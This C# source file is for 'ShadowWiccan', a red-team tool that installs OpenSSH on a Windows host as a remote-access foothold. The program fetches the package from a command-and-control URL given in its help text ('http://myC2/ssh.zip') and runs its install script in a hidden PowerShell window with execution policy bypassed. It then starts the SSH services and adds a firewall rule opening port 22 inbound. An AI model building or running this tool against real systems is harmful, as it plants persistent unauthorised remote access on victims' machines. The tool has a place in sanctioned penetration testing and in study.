using System;
using System.Net;
using System.IO;
using System.Linq;
using System.Threading;
using System.IO.Compression;
using System.Diagnostics;
using System.ServiceProcess;


namespace ShadowWiccan
{
    class Program
    {
        public static void SWheader()
        {
            Console.ForegroundColor = ConsoleColor.Cyan;
            Console.WriteLine("* * * * * * * * * * * * * * * * * * * * * * * * * *");
            Console.ForegroundColor = ConsoleColor.DarkMagenta;
            Console.WriteLine(@"      ╔═╗┬ ┬┌─┐┌┬┐┌─┐┬ ┬╦ ╦┬┌─┐┌─┐┌─┐┌┐┌");
            Console.WriteLine(@"      ╚═╗├─┤├─┤ │││ ││││║║║││  │  ├─┤│││");
            Console.WriteLine(@"      ╚═╝┴ ┴┴ ┴─┴┘└─┘└┴┘╚╩╝┴└─┘└─┘┴ ┴┘└┘");
            Console.ResetColor();
            Console.ForegroundColor = ConsoleColor.Cyan;
            Console.WriteLine("* * * An OpenSSH install wrapper for Windows * * *");
            Console.ResetColor();
            Console.WriteLine("");

        }
        public static void Help()
        {
            SWheader();

            Console.ForegroundColor = ConsoleColor.White;
            Console.WriteLine("Example: ");
            Console.ForegroundColor = ConsoleColor.DarkMagenta;
            Console.WriteLine("    C:\\>ShadowWiccan.exe -w \"http://myC2/ssh.zip\"");
            Console.WriteLine("    C:\\>ShadowWiccan.exe -f \"C:\\Folder\\ssh.zip\"");
            Console.WriteLine("    C:\\>ShadowWiccan.exe -u");
            Console.ResetColor();
            System.Environment.Exit(1);
        }

        /// //////////////////////////////////////////////////
        /// ////   Create working dir  ///////////////////////
        /// //////////////////////////////////////////////////
        public static void createSshDir()
        {

            bool dirExists = Directory.Exists(@"C:\ProgramData\ssh");
            if (dirExists == true)
            {
                Console.WriteLine("[-] Seems like 'C:\\ProgramData\\ssh' already exists. Exiting...");
                System.Environment.Exit(1);
            }

            //Create working directory
            Directory.CreateDirectory(@"C:\ProgramData\ssh");
        }

        /// //////////////////////////////////////////////////
        /// ////   Get Via HTTP        ///////////////////////
        /// //////////////////////////////////////////////////
        public static void getViaHttp(string httpUri)
        {
            Console.ForegroundColor = ConsoleColor.Cyan;
            Console.WriteLine("[+] Downloading OpenSSH via HTTP");
            Console.ForegroundColor = ConsoleColor.DarkMagenta;
            Console.WriteLine("    " + httpUri);
            Console.ResetColor();
            using (var client = new WebClient())
            {
                try
                {
                    client.DownloadFile(httpUri, "C:\\ProgramData\\ssh\\ssh.zip");
                }
                catch (WebException webEx)
                {
                    Console.WriteLine("[-] Remote server returned a 404! Exiting...");
                    System.Environment.Exit(1);
                }

                Console.WriteLine(" ");
                Console.ForegroundColor = ConsoleColor.Cyan;
                Console.WriteLine("[+] OpenSSH payload written to:");
                Console.ForegroundColor = ConsoleColor.DarkMagenta;
                Console.WriteLine("    C:\\ProgramData\\ssh\\ssh.zip ");
                Console.ResetColor();
                string zipLocation = @"C:\ProgramData\ssh\ssh.zip";
                sshInstall(zipLocation);
            }
        }


        /// //////////////////////////////////////////////////
        /// ////   Get Via FS          ///////////////////////
        /// //////////////////////////////////////////////////
        public static void getViaFS(string fsPath)
        {
            Console.ForegroundColor = ConsoleColor.Cyan;
            Console.WriteLine("[+] Installing SSH via UNC path: " + fsPath);
            Console.ResetColor();
            bool isZip = fsPath.EndsWith(".zip");
            if (isZip == false)
            {
                Console.WriteLine("   [-] File must be a zip. Exiting...");
                System.Environment.Exit(1);
            }

            string zipLocation = @"C:\ProgramData\ssh\ssh.zip";
            File.Copy(fsPath, zipLocation);

            sshInstall(zipLocation);
        }

        /// //////////////////////////////////////////////////
        /// ////   Unzip and Install   ///////////////////////
        /// //////////////////////////////////////////////////
        public static void sshInstall(string zipPath)
        {

            Console.WriteLine("   [+] Unzipping and Installing");
            string extractPath = @"C:\ProgramData\ssh\";
            try
            {
                //Unzip - Need .net 4.5+
                ZipFile.ExtractToDirectory(zipPath, extractPath);
            }
            catch (InvalidDataException)
            {
                Console.WriteLine("      [-] Data Error! Is the file a zip? Exiting...");
                System.Environment.Exit(1);
            }

            string[] scriptSearch = Directory.GetFiles(@"C:\ProgramData\ssh\", "install-sshd.ps1", SearchOption.AllDirectories);

            if (scriptSearch[0].Contains("install-sshd.ps1"))
            {
                Console.WriteLine("      [+] Install script found! Installing...");
                string installScript = scriptSearch[0];
                Process process = new Process
                {
                    StartInfo =
                    {
                        UseShellExecute = false,
                        RedirectStandardOutput = true,
                        RedirectStandardError = true,
                        CreateNoWindow = true,
                        FileName = @"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                        Arguments = "-ExecutionPolicy Bypass -File " + installScript,
                    }
                };
                process.Start();
                Thread.Sleep(200);
                Console.ForegroundColor = ConsoleColor.DarkMagenta;
                Console.WriteLine(@"          _  _|\_");
                Thread.Sleep(350);
                Console.WriteLine("         | |  (\"}");
                Thread.Sleep(350);
                Console.WriteLine(@"         >_<_.-@-._ _ /*  * S ^ *  H ~ *");
                Thread.Sleep(350);
                Console.WriteLine(@"          \--,  .-`*(/   * `  S +*  ^");
                Thread.Sleep(350);
                Console.WriteLine(@"          |  /==\");
                Thread.Sleep(350);
                Console.WriteLine(@"          |  |   \");
                Thread.Sleep(350);
                Console.WriteLine(@"          |  /___\");
                Thread.Sleep(500);
                Console.ResetColor();

                string sshdS = "sshd";
                string sshagentS = "ssh-agent";
                if (DoesServiceExist(sshdS) == true)
                {
                    Thread.Sleep(1000);
                    if (DoesServiceExist(sshagentS) == true)
                    {
                        Console.WriteLine("      [+] Done.");
                        Console.WriteLine("");
                        Thread.Sleep(1000);
                        sshConfigure();
                    }
                    else
                    {
                        Console.WriteLine("      [-] OpenSSH Service 'ssh-agent' not found after install. Are you admin? Exiting...");
                        System.Environment.Exit(1);
                    }
                }
                else
                {
                    Console.WriteLine("      [-] OpenSSH Service 'sshd' not found after install. Are you admin? Exiting...");
                    System.Environment.Exit(1);
                }
            }
            else
            {
                Console.WriteLine("      [-] Cannot find official PowerShell install script 'install-sshd.ps1'. Exiting...");
                System.Environment.Exit(1);
            }


            Process fireProcess = new Process
            {
                StartInfo =
                    {
                        UseShellExecute = false,
                        RedirectStandardOutput = true,
                        RedirectStandardError = true,
                        CreateNoWindow = true,
                        FileName = @"C:\Windows\System32\netsh.exe",
                        Arguments = "advfirewall firewall add rule name=WinOpenSSHD dir=in action=allow protocol=TCP localport=22",
                    }
            };
            fireProcess.Start();
            Thread.Sleep(2000);
            Console.WriteLine("   [+] Firewall rule 'WinOpenSSHD' added to allow port 22 in");
            Console.WriteLine("");
            Console.ForegroundColor = ConsoleColor.Cyan;
            Console.WriteLine("[+] OpenSSH install and configuration COMPLETE");
            Console.WriteLine("[+] Enjoy your accessh!");
            Console.ResetColor();

        }


        public static bool DoesServiceExist(string serviceName)
        {
            ServiceController[] services = ServiceController.GetServices();
            var service = services.FirstOrDefault(s => s.ServiceName == serviceName);
            return service != null;
        }

        public static void sshConfigure()
        {
            Console.ForegroundColor = ConsoleColor.Cyan;
            Console.WriteLine("[+] Configuring OpenSSH");
            Console.ResetColor();

            //Start the two services if they exist

            // SSHD service start
            ServiceController service = new ServiceController("sshd");
            try
            {
                TimeSpan timeout = TimeSpan.FromMilliseconds(3000);
                service.Start();
                service.WaitForStatus(ServiceControllerStatus.Running, timeout);
                Console.WriteLine("   [+] Service 'sshd' started successfully");
            }
            catch
            {
                Console.WriteLine("   [-] Service 'sshd' not starting or has already been running! Exiting...");
                System.Environment.Exit(1);
            }

            Thread.Sleep(1000);

            // SSH-AGENT service start
            ServiceController serviceAgent = new ServiceController("ssh-agent");
            try
            {
                TimeSpan timeout = TimeSpan.FromMilliseconds(6000);
                serviceAgent.Start();
                serviceAgent.WaitForStatus(ServiceControllerStatus.Running, timeout);
                Console.WriteLine("   [+] Service 'ssh-agent' started successfully");
            }
            catch
            {
                Console.WriteLine("   [-] Service 'ssh-agent' not starting or has already been running! Exiting...");
                System.Environment.Exit(1);
            }

            // ** Update permissions if needed
            //icacls.exe "C:\Users\redsuit\Documents\ssh\OpenSSH-Win64" /grant Everyone:RX /T

        }

        /// //////////////////////////////////////////////////
        /// ////   Uninstall SSH       ///////////////////////
        /// //////////////////////////////////////////////////
        public static void sshUninstall()
        {
            Console.ForegroundColor = ConsoleColor.Cyan;
            Console.WriteLine("[+] Uninstalling Windows OpenSSH.");
            Console.ResetColor();


            bool sshdirCheck = Directory.Exists(@"C:\ProgramData\ssh");
            if (sshdirCheck == false)
            {
                Console.ForegroundColor = ConsoleColor.Cyan;
                Console.WriteLine(@"[-] Could not find C:\ProgramData\ssh\ directory. Is it already uninstalled? Exiting...");
                Console.ResetColor();
                System.Environment.Exit(1);
            }


            string[] scriptSearch = Directory.GetFiles(@"C:\ProgramData\ssh\", "uninstall-sshd.ps1", SearchOption.AllDirectories);

            try
            {
                if (scriptSearch[0].Contains("uninstall-sshd.ps1"))
                {
                    string uninstallScript = scriptSearch[0];
                    Process process = new Process
                    {
                        StartInfo =
                    {
                        UseShellExecute = false,
                        RedirectStandardOutput = true,
                        RedirectStandardError = true,
                        CreateNoWindow = true,
                        FileName = @"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                        Arguments = "-ExecutionPolicy Bypass -File " + uninstallScript,
                    }
                    };
                    process.Start();
                    Thread.Sleep(1000);
                    Console.WriteLine("   [+] OpenSSH services uninstalled.");
                    Directory.Delete(@"C:\ProgramData\ssh\", true);

                    Thread.Sleep(500);
                    Console.WriteLine(@"   [+] Direcrtory C:\ProgramData\ssh\ deleted");
                    Thread.Sleep(500);


                    // Add a firewall rule
                    Process fireProcess = new Process
                    {
                        StartInfo =
                        {
                            UseShellExecute = false,
                            RedirectStandardOutput = true,
                            RedirectStandardError = true,
                            CreateNoWindow = true,
                            FileName = @"C:\Windows\System32\netsh.exe",
                            Arguments = "advfirewall firewall delete rule name=WinOpenSSHD dir=in",
                        }
                    };
                    fireProcess.Start();
                    Thread.Sleep(2000);
                    Console.WriteLine("   [+] Firewall rule 'WinOpenSSHD' deleted");
                    Thread.Sleep(1500);
                    Console.ForegroundColor = ConsoleColor.Cyan;
                    Console.WriteLine("[+] Uninstall complete.");
                    Console.ResetColor();

                }
                else
                {
                    Console.WriteLine("   [-] Cannot find official PowerShell install script 'uninstall-sshd.ps1'. Exiting...");
                    System.Environment.Exit(1);
                }
            }
            catch
            {
                Console.WriteLine("   [-] Uninstall failed for some reason...");
                System.Environment.Exit(1);
            }

        }

        /// //////////////////////////////////////////////////
        /// ////   MAIN                ///////////////////////
        /// //////////////////////////////////////////////////
        static void Main(string[] args)
        {
            if (args.Length == 0 || args.Length > 2) { Help(); };
            
            string sshGetProto = args[0];
            if (!(sshGetProto == "-u" || sshGetProto == "-f" || sshGetProto == "-w")) { Help(); };

            SWheader();
            if (sshGetProto == "-u")
            {
                sshUninstall();
                Console.ResetColor();
                System.Environment.Exit(1);
            }

            string sshGetPath = args[1];

            if (sshGetProto == "-w")
            {
                createSshDir();
                getViaHttp(sshGetPath);
                System.Environment.Exit(0);
            }

            if (sshGetProto == "-f")
            {
                createSshDir();
                getViaFS(sshGetPath);
                System.Environment.Exit(0);
            }
            else
            {
                Console.WriteLine("[-] Wrong parameters entered. Exiting... ");
                
            }
            Console.ResetColor();
        }
    }
}
